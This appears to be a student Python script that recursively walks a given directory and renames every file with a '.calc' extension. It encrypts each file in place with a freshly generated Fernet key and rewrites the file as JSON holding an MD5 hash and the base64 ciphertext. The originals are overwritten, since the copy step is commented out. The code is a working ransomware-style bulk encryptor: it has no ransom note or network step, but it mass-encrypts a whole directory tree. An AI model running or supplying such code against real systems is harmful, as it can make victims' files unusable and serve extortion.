import os
import shutil
from cryptography.fernet import Fernet
import base64
import hashlib
import json
import sys




def GenerateKeyEncryption():
    key = Fernet.generate_key()
    with open(keyFile, 'wb') as filekey:
        filekey.write(key)

def ContentBS64(file):
    with open(file, "rb") as file1:
       file_content = file1.read()
    encoded_content = base64.b64encode(file_content)

    with open(file, "wb") as output_file:
        output_file.write(encoded_content)

    with open(file, "rb") as data_file:
        data = data_file.read()
        base64_string = data.decode('utf-8')
        return base64_string

def md5checksum(fname):
    md5 = hashlib.md5()
    f = open(fname, "rb")
    while chunk :=f.read(4096):
        md5.update(chunk)
    return md5.hexdigest()


def main(src):
        for item in os.listdir(src):
            s = os.path.join(src, item)
            if os.path.isdir(s):
                main(s)
            else:
                FileEXC = s+'.calc' #adding exc in the end of path
                #shutil.copy(s, os.path.join(src,FileEXC)) #if you want to copay and not to overwrite the main files
                os.rename(s , FileEXC)
                with open(keyFile, 'rb') as filekey:
                    key = filekey.read()
                fernet = Fernet(key)
                with open(FileEXC, 'rb') as file:
                    original = file.read()
                encrypted = fernet.encrypt(original)
                with open(FileEXC, 'wb') as encrypted_file:
                    encrypted_file.write(encrypted)
                dataF = ContentBS64(FileEXC)
                MD5Hash = md5checksum(FileEXC)
                x = {
                    "filehash": str(MD5Hash),
                    "filecontents":str(dataF)
                }
                JSONData = json.dumps(x)
                with open(FileEXC, 'w') as json_file:
                    json_file.write(JSONData)
                
                with open(FileEXC, "r")as finalOpen:
                    file_content = finalOpen.read()
                    print(f'File {FileEXC} Encrypted')

if __name__=="__main__":    
    if len(sys.argv) != 3:
        print(50 * "-")
        print("ERROR: Incorrect number of arguments!")
        print("Enter the correct path to encrypt and the path+filename for the encryption key.")
        print("Example: python3 ProjectP1.py /Users/kb/test/ /Users/bk/TestKey/KEY.txt")
        print(50 * "-")
        sys.exit(1)

    keyFile = sys.argv[2]
    print(f"Encryption Key File: {keyFile}")

    GenerateKeyEncryption()

    filepath = sys.argv[1]
    print(f"Target Directory: {filepath}")

    main(filepath)
